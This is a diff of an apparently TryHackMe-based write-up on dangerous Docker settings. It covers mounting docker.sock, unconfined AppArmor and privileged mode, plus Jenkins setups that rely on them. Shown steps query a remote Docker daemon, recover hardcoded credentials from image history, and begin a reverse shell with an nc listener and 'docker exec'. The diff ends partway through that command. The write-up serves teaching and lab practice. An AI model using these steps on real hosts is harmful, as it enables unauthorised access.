@@ -108,13 +108,13 @@ Observe the following:
 - Labels suggest that the base image is `ubuntu:18.04`
 
 The first three points are concerning, as each of them represents a security issue:
-- Binding *docker.sock* exposes the host's daemon to the container. This effectively lets the container access the host's Docker directly: listing images, launching containers, executing commands, and so forth.
+- Binding *docker.sock* exposes the host's daemon to the container. This allows the container access the host's Docker directly: listing images, launching containers, executing commands, and so forth.
 - AppArmor handles the container's security profile. Setting it to `unconfined` effectively disables any protections in the container.
 - Privileged mode effectively gives container full control over the host system. If a privileged container were compromised, an attacker could leverage it to perform arbitrary damage against the host.
 
 It's worth stopping here and noting that these are *not* default settings for `docker run`.
 
-With that in mind, why would someone want to relax these settings? In the context of DevSecOps, think about this in the context of CI/CD automation. Let's start with Jenkins:
+With that in mind, why would someone want to relax these settings? In the context of DevSecOps, this setup could facilitate CI/CD goals. A lesser-known, perhaps antiquated example of this is Jenkins:
 - The [official Jenkins Docker install guide](https://www.jenkins.io/doc/book/installing/docker/#on-macos-and-linux) explicitly says to use `--privileged` mode, although it "may be relaxed with newer Linux versions." Note that they provide no recommendation here about a more secure specification.
 - The [Docker Pipeline plugin](https://www.jenkins.io/doc/book/pipeline/docker/#using-a-remote-docker-server) will communicate with the local daemon via `/var/run/docker.sock`. Likewise, the [Docker slaves plugin](https://plugins.jenkins.io/docker-slaves/) has notes about bind mounting `docker.sock` in a build container.
 - Although Jenkins takes no official stance on AppArmor, a developer or maintainer may choose to disable it in the event that AppArmor is conflicting with the container's needs.
@@ -130,11 +130,8 @@ docker -H 10.10.20.228 history --no-trunc dockertest
 The output will show each layer, starting with the last layer first. For clarity, let's remove the column headers, SHA256 hash, and uptime:
 ```
 ... /bin/sh -c #(nop)  CMD ["/usr/sbin/sshd" "-D"]                               
-
 ... /bin/sh -c #(nop)  EXPOSE 22                                                 
-
 ... /bin/sh -c #(nop)  USER root        
-
 ...
 ```
 
@@ -191,15 +188,15 @@ CMD ["/usr/sbin/sshd", "-D"]
 
 Hardcoded secrets are revealed. These match the credentials given by the TryHackMe lab. However, let's pretend we didn't see those (i.e., that the developer had chosen to manage secrets securely), and continue investigating.
 
-Without the root user's credentials, we can still enter the container: by using a reverse shell.
+Even without the root user's credentials, we could still enter the container. The first way, as noted earlier, is by using `docker exec` to run a shell or shell commands directly. Another way is by abusing `docker exec` to launch a reverse shell.
 
-Start a listener on the host:
+To connect via a reverse shell, start a listener on the host:
 
 ```
 nc -lvnp 4242
 ```
 
-Then, leverage the exposed container:
+Then, leverage the exposed container. Since the container is Ubuntu, we can use a raw Bash TCP connection.
 
 ```
 docker -H 10.10.20.228 exec 7b7461f9882e \
